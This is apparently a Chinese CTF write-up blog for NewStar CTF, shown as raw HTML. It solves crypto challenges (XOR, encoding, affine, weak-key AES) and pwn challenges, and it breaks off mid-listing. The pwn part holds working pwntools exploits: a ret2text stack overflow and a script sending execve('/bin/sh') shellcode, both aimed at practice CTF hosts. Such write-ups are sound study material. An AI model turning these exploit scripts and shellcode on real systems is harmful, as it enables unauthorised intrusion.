class="built_in">print</span>(plaintext_str)</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><p>使用cyberchef，第一段得到<code>flag&#123;dazzling_encoding#4e0ad4</code>，第二段得到：<code>f0ca08d1e1d0f10c0c7afe422fea7</code>，第三段使用UUencode解密<a href="https://ctf.bugku.com/tool/uuencode">UUencode加密&#x2F;解密 - Bugku CTF</a>，得到<code>c55192c992036ef623372601ff3a&#125;</code>。</p><p>拼接一下，得到flag：<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>附件一段python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append((key[<span class="number">0</span>]*f + key[<span class="number">1</span>]) % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></span><br></pre></td></tr></table></figure><p>因为flag前4个字母是flag，因此可以列出4个方程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">221+256*a=key0*102+key1</span><br><span class="line">67+256*b=key0*108+key1</span><br><span class="line">136+256*c=key0*97+key1</span><br><span class="line">238+256*d=key0*103+key1</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key0 = (52 + 256 * (a - b + c - d)) / -12</span><br><span class="line">key1 = 221 + 256 * a - key0 * 102</span><br></pre></td></tr></table></figure><p>测试猜测key0&#x3D;17，key1&#x3D;23</p><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密文和密钥</span></span><br><span class="line">ciphertext_hex = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">key = (<span class="number">17</span>, <span class="number">23</span>)  <span class="comment"># 请将a和b替换为实际的密钥值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算key[0]的模数逆</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    m0, x0, x1 = m, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">1</span>:</span><br><span class="line">        q = a // m</span><br><span class="line">        m, a = a % m, m</span><br><span class="line">        x0, x1 = x1 - q * x0, x0</span><br><span class="line">    <span class="keyword">return</span> x1 + m0 <span class="keyword">if</span> x1 &lt; <span class="number">0</span> <span class="keyword">else</span> x1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将密文转换为字节列表</span></span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向解密</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciphertext_bytes:</span><br><span class="line">    original_byte = ((c - key[<span class="number">1</span>]) * mod_inverse(key[<span class="number">0</span>], <span class="number">256</span>)) % <span class="number">256</span></span><br><span class="line">    flag.append(original_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的字节列表转换为字符串</span></span><br><span class="line">original_flag = <span class="built_in">bytes</span>(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(original_flag)</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p><h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>打开附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>key是<strong>32bytes</strong>,<strong>256bits</strong> ；iv是<strong>16bytes ,128bits</strong></p><p>key^iv ，那么只有 iv 与 key的<strong>低128位</strong>相异或，所以<strong>key的高128位是固定不变的</strong>。所以输出结果的高128bits,就是key的高128bits,进而可以得到key的所有值256bits。</p><p>之后key的低128bits，与输出结果的低128bits相异或，所得结果就是iv的值了</p><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">xor = <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>^<span class="number">1</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">out = long_to_bytes(xor)</span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:])^bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line"><span class="comment"># print(iv)</span></span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"><span class="comment"># print(iv)</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到<code>b&#39;firsT_cry_Aes\x00\x00\x00&#39;</code></p><p>flag：<code>flag&#123;firsT_cry_Aes&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>3&#x2F;5</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>栈溢出</p><p>ida打开发现明显的栈溢出，而且还有后门backdoor()函数</p><p>反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to NewStar CTF!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Show me your magic&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdoor代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdoor地址00000000004011FB</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">return_address = <span class="number">0x4011FB</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = padding + p64(return_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接目标服务</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27081</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收响应</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>之后直接cat flag即可拿到flag：<code>flag&#123;11b564d9-fb42-41c6-a215-a750c4fc8c28&#125;</code></p><h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to NewStar CTF!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Show me your magic&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  JUMPOUT(<span class="number">0x66660000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接写shellcode即可，网上随便搜一个shellcode，编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28681</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取欢迎信息</span></span><br><span class="line"><span class="built_in">print</span>(r.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入shellcode到内存块</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭进程</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>直接cat flag</p><h3 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h3><p>主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        shop();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        makemoney();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        dont_try();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Go to the shop &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Make some money&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Don&#x27;t choose   &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shop()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">shop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===Welcome to newstar shop===&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.newstar&#x27;s gift          20$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.pwn write up            40$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.shell                 9999$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;All things are only available for one day!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to buy?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)money &gt; <span class="number">0x13</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        money -= <span class="number">20</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You buy a newstar&#x27;s gift&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That is the gift:&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What will happen when int transfer to unsigned int?&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)money &gt; <span class="number">0x27</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        money -= <span class="number">40</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You buy a pwn write up&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That is free after the match,haha&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)money &gt; <span class="number">0x270E</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    money = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How do you buy it?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makemoney()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">makemoney</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========Job list==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.McDonald part time job 20$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.MeiTuan takeout        40$&quot;</span>);</span><br><span class="line">  <span 